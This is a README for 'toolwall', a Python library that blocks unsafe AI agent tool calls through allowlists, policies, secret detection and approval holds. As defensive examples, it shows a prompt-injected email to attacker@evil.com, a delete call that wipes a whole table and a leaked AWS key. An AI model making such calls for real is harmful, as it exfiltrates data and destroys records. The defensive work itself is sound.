# toolwall

[![PyPI version](https://img.shields.io/pypi/v/toolwall.svg?cacheSeconds=300)](https://pypi.org/project/toolwall/)
[![Python versions](https://img.shields.io/pypi/pyversions/toolwall.svg)](https://pypi.org/project/toolwall/)
[![License: MIT](https://img.shields.io/pypi/l/toolwall.svg)](toolwall/LICENSE)
[![Tests](https://img.shields.io/badge/tests-204%20passing-brightgreen.svg)](toolwall/tests)
[![Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](toolwall/pyproject.toml)
[![Failure suite](https://img.shields.io/badge/attack%20suite-35%2F35%20blocked-brightgreen.svg)](gate-suite/results/REPORT.md)

> ## The security gateway for AI agent tool calls.
>
> Your LLM can generate a **valid** tool call. That doesn't mean it's **safe** to execute.

**Status: v0.4.1 (alpha) · [on PyPI](https://pypi.org/project/toolwall/) · 204 tests · published attack suite.**

```bash
pip install toolwall
```

```python
from toolwall import ToolWall, Policy, ToolSchema

wall = ToolWall()   # default-deny, secret detection + audit on
wall.register("delete_user", delete_user,
              schema=ToolSchema(required=["user_id"]),
              policy=Policy(require_approval=True))

result = wall.call("delete_user", {"user_id": "123"})

# result.needs_approval -> True   (held; a human must say yes before it runs)
# result.reason         -> "approval required for 'delete_user'"
```

The tool never ran. Every decision is in the audit log.

---

## The problem nobody guards

Constrained decoding and JSON schemas guarantee your agent's tool calls are
*well-formed*. Nothing guarantees they're *allowed*:

```python
delete_records(filter={})            # perfectly valid JSON. whole table gone.
send_email(to="attacker@evil.com")   # recipient injected via a poisoned web page
transfer_money(amount=999999999)     # schema-valid. every field the right type.
db_query(limit=10_000_000)           # production melts.
```

Every one of these passes schema validation. Structured outputs, JSON schema,
and content moderation all wave them through. The failure mode is **valid-but-wrong**,
and it lives in the gap between "the LLM produced output" and "the tool ran."

toolwall is the fail-closed checkpoint in that gap.

```
   agent tool call (OpenAI / Anthropic / Gemini native JSON, or a plain dict)
        │
        ▼
   ┌─ toolwall ─────────────────────────────────────────────┐
   │  known tool?  schema?  policy?  secrets?  budget?       │──BLOCK──► logged, never runs
   └───────────────────────────┬────────────────────────────┘
                               ▼ ALLOW
                          your tool runs
```

## What it stops (real attacks, real output)

**A destructive call with no guardrail:**

```python
wall.call("delete_records", {"filter": {}})
# BLOCKED: policy violation: arg 'filter' rejected by not_empty
```

**A secret leaving through a tool argument:**

```python
wall.call("send_email", {"to": "ops@ourco.com", "body": "aws key AKIA..."})
# BLOCKED: secret detected (aws-access-key) in arg 'body'
```

**An out-of-range value:**

```python
wall.call("db_query", {"q": "everything", "limit": 10_000_000})
# BLOCKED: policy violation: arg 'limit' rejected by in_range(1, 100)
```

**A tool the agent was never granted:**

```python
wall.call("run_shell", {"cmd": "..."})
# BLOCKED: unknown tool: 'run_shell'
```

Everything that isn't explicitly allowed is blocked. That is the whole idea.

## Features

- **Fail-closed by default**: unknown tool, bad schema, policy violation, budget hit, or unparseable payload all block *before* the tool runs. Registration is the allowlist.
- **Policy engine**: value constraints (`in_range`, `one_of`, `matches`, `email_domain`, `starts_with`, `ends_with`), cross-argument rules, human-approval flags, and budget caps (per run / per tool / USD) that hold on a Gate shared across threads.
- **Secret detection, both directions**: AWS, OpenAI, GitHub, Stripe, Slack, JWT, PEM, and high-entropy strings caught in tool arguments *and in tool return values* (strings, dict keys and values, lists, tuples such as database rows, sets, bytes, dataclasses), then blocked or redacted. Output that cannot be scanned is withheld. Reasons, reports and the audit log are scrubbed of detected secrets.
- **Dry-run**: run your whole agent with nothing executing, then read what it *would* have done and generate a starter policy from it.
- **MCP guard**: `MCPGuard` runs the same check and execute path (budget, dry-run, receipts, output scanning) in front of a function that forwards to your MCP server.
- **Audit trail**: every verdict exported to JSON/CSV.
- **Zero required dependencies**: stdlib only, Python 3.10+.

**Proof, not promises:** the published suite blocks **35/35 attack cases across 11 classes
with 0 false blocks on its 14 clean cases**, at a per-call p95 well under a millisecond
for small arguments (cost grows with argument size: about 2 ms at 50 KB). Ordinary text the
shield is known to flag is listed in the report too
([full report](gate-suite/results/REPORT.md), reproduce with `python gate-suite/run_suite.py`).
The suite is a regression suite for one reference config, not a measure of coverage
against attacks nobody has written yet. Secret detection is pattern + entropy based and
is never 100%; the report states exactly what is and is not proven.
**Try to break it. Issues and PRs welcome.**

**The verdict covers the call, not the state of the world.** An approved
`delete_records(id=42)` deletes whatever 42 points to at execution time; if the
resource was swapped after the check, the receipt still matches because the argument
never changed. Argument integrity is not resource integrity. For resources that can
change owner or meaning, re-verify inside the tool's own transaction (for example
compare-and-swap on a version column); the gate cannot see your datastore, and any
external authorization layer that claims otherwise is overclaiming.

## Why not just use the guardrails in my agent framework?

Use them too. But two things make toolwall different from a security layer bundled
into one workspace or framework:

**It's an allowlist, not a blocklist.** Most bundled protections ship a list of
dangerous patterns to deny. Anything the authors did not anticipate gets through.
toolwall inverts that: registration *is* the allowlist, and everything not explicitly
allowed is blocked. You cannot forget to deny an attack you never thought of.

**It runs inside your agent, not instead of it.** A workspace's built-in security
protects that workspace. If your agent is built on LangGraph, the OpenAI SDK, CrewAI,
or plain Python, you cannot borrow it without adopting the whole product. toolwall is
a zero-dependency library that drops into the agent you already have, on any framework,
and speaks OpenAI, Anthropic, Gemini, and MCP.

And what toolwall is **not**: it is not a sandbox. A sandbox isolates the *process*;
toolwall authorizes the *call*. They solve different layers, and a serious production
setup wants both, alongside least privilege and network policy.

## How to use

### 1. Install

```bash
pip install toolwall
```

### 2. Wrap your tools in a ToolWall

```python
from toolwall import ToolWall, Policy, ToolSchema, in_range, not_empty

wall = ToolWall()   # default-deny, secret detection + audit on
wall.register("db_query", db_query,
              schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
              policy=Policy(constraints={"limit": in_range(1, 100)}))
wall.register("delete_records", delete_records,
              schema=ToolSchema(required=["filter"], types={"filter": dict}),
              policy=Policy(constraints={"filter": not_empty}, require_approval=True))
wall.budget(max_calls=20)

r = wall.call("db_query", {"q": "open tickets", "limit": 5})   # r.allowed, runs
r = wall.call("delete_records", {"filter": {}})                # r.blocked, r.reason

# already have an LLM response object? gate it directly:
results = wall.guard(openai_response)   # OpenAI / Anthropic / Gemini shapes
```

Only an `ALLOW` verdict executes the tool. `Gate` is the lower-level primitive
underneath if you want to compose it yourself.

Two policy details worth knowing: `matches()` is a full match (anchor nothing, the
whole value must match), and `ends_with("@ourco.com")` is a string rule that a
comma-separated recipient list passes. For recipients use `email_domain("ourco.com")`,
which accepts exactly one bare address on that exact domain.

**Approvals.** A `require_approval` tool is held (`r.needs_approval`) and never runs
without a yes. Give the wall a handler and it is asked synchronously, with the
`GateResult` (tool name and arguments) to decide on:

```python
def ask_human(result):
    return input(f"run {result.call.name} {result.call.args}? [y/N] ") == "y"

wall = ToolWall(approval=ask_human)          # or wall.approve_with(ask_human)
```

The handler cannot change what runs: the arguments are bound by a receipt at check
time, and an edited call is refused. Approving later (from Slack, a ticket, a phone)
is not supported yet: a held result cannot be executed after the fact, so re-run the
call once the human has said yes.

### 3. Start in dry-run: see what your agent would do, before it does anything

```python
from toolwall import suggest_policies

wall = ToolWall()
# ... register your tools, then ...
wall.dry_run = True
# ... run your agent as usual; ALLOW calls are simulated, never executed ...
print(wall.report())            # verdict counts, blocked reasons, secrets caught
print(suggest_policies(wall.gate))   # a draft policy from the calls observed, for you to review
wall.export("audit.json", "audit.csv")
```

This is the safest way to try toolwall on a real agent: nothing executes, and you
get a report of what it *would* have done plus a starter policy.

### 4. Guard an MCP server

```python
from toolwall import MCPGuard
guard = MCPGuard(wall.gate, forward=call_downstream_mcp_server)
decision = guard.handle(tool_name, args)   # only ALLOW is forwarded; blocks return an MCP error
```

`forward` is your own function that calls the downstream server. toolwall does not
ship an MCP transport yet: `pip install 'toolwall[mcp]'` only installs the `mcp`
package for that function to use.

## Examples

Runnable from a clone of this repo (`cd toolwall`):

| Example | What it shows | Needs a key? |
|---|---|---|
| [`examples/quickstart.py`](toolwall/examples/quickstart.py) | Six gated scenarios: allow, unknown tool, out-of-range, empty-filter delete, approval hold, secret block | No |
| [`examples/dangerous_agent_demo.py`](toolwall/examples/dangerous_agent_demo.py) | An off-the-rails agent replayed with vs without the gate: table wiped and secrets leaked ungated, all stopped gated | No |
| [`examples/mcp_guard_demo.py`](toolwall/examples/mcp_guard_demo.py) | The same gate in front of an MCP-style server: only the safe call reaches it | No |
| [`examples/live_gemini_agent.py`](toolwall/examples/live_gemini_agent.py) | A **real Gemini agent** using native function calling; toolwall allows the safe query, holds a destructive delete for approval, and blocks a secret leaving via email | `GEMINI_API_KEY` |

```bash
cd toolwall
python examples/quickstart.py
python examples/dangerous_agent_demo.py
python examples/live_gemini_agent.py     # set GEMINI_API_KEY first
```

Run the tests and the published attack suite yourself:

```bash
cd toolwall && pip install -e ".[dev]"
pytest                                    # 204 tests
python ../gate-suite/run_suite.py         # 35/35 attacks blocked, prints the G1 report
```

## Roadmap (Phase 0 → 1)

- [x] Provider intake (OpenAI chat + responses, Anthropic, Gemini, plain dict)
- [x] Fail-closed gate + schema layer + audit meter
- [x] Policy engine: value constraints, cross-arg rules, approval flags, budget caps
- [x] Shield: secret detection/redaction on tool args and text (registration is the allowlist)
- [x] Failure-scenario suite: 35 attacks across 11 classes, report published per release
- [x] Dry-run mode: full agent run, zero execution, `gate.report()` "would-have-done" summary
- [x] Suggested-policy generator: observed calls -> reviewable draft schema + policy
- [x] `toolwall-mcp`: `MCPGuard` runs the full gate in front of a forwarding function (tested core; stdio transport not shipped yet)
- [x] Release-ready: builds clean, `twine check` passes, clean-install verified ([RELEASING.md](toolwall/RELEASING.md))
- [x] **Published to PyPI**: [`pip install toolwall`](https://pypi.org/project/toolwall/)

### Planned

- [ ] **Stateful / cross-call sequence policies**: catch attacks where each call is individually valid but the *sequence* is dangerous. Community-supplied threat model: `read -> exfiltrate`, `lookup -> purchase`, and repeated low-risk calls against a cumulative budget (that last one is already covered by budget caps). Budget caps track cross-call count and cost, and `gate.history` records every call, so a stateful hook is the natural next layer. Two things have to land first: sequence rules must filter on *executed* calls (a blocked read must not arm a `read -> exfiltrate` rule), and history needs a branch/turn boundary so an abandoned branch cannot trigger a rule.

## What happened to TOAP?

This repo used to be **TOAP**, a token-compression DSL for tool calls. We measured it honestly and killed it. The full postmortem (real numbers, tokenizer analysis, lessons) is on the [`toap-v0.1-archive`](https://github.com/Dev-Saif-Ops/toolwall/tree/toap-v0.1-archive) branch. toolwall keeps the part of TOAP that was never about compression: the fail-closed checkpoint between the model and your tools.

## License

MIT, see [LICENSE](LICENSE)

Built by [Mohammad Safwan Athar](https://github.com/Dev-Saif-Ops)
